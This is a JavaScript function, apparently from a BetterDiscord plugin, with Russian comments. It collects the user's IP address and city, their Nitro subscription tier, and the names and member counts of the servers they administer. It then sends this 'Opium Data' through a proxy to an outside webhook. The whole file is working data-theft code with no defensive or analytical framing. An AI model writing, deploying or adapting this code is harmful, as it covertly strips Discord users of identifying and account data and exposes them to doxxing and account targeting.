async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
    let result = {
        ip: null,
        location: null,
        nitro: "Нет",
        admin_servers: []
    };
    
    // 1. Получаем IP и локацию
    try {
        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        
        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
        }
    } catch (e) { console.error("IP Error", e); }

    // 2. Проверяем статус Nitro
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType === 1) result.nitro = "Nitro Classic";
            else if (user.premiumType === 2) result.nitro = "Nitro";
            else if (user.premiumType === 3) result.nitro = "Nitro Basic";
        }
    } catch (e) { console.error("Nitro Error", e); }

    // 3. Ищем серверы, где ты админ, и считаем людей
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                // Проверяем право "Администратор" (8n - BigInt)
                if (PermissionStore.can(8n, g)) {
                    
                    // Пытаемся достать количество участников разными способами
                    let count = g.memberCount || g.approximateMemberCount;
                    
                    // Если вдруг в объекте пусто, делаем принудительный запрос в GuildStore
                    if (!count) {
                        const freshGuild = GuildStore.getGuild(g.id);
                        if (freshGuild) {
                            count = freshGuild.memberCount || freshGuild.approximateMemberCount;
                        }
                    }

                    result.admin_servers.push({
                        name: g.name,
                        members: count || 0 // Если вообще ничего не нашли, ставим 0
                    });
                }
            }
        }
    } catch (e) { console.error("Guild Error", e); }

    // 4. Отправка на вебхук через прокси
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Opium Data**\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``
            })
        });
        return response.ok;
    } catch (e) {
        console.error("Webhook Error", e);
        return false;
    }
}
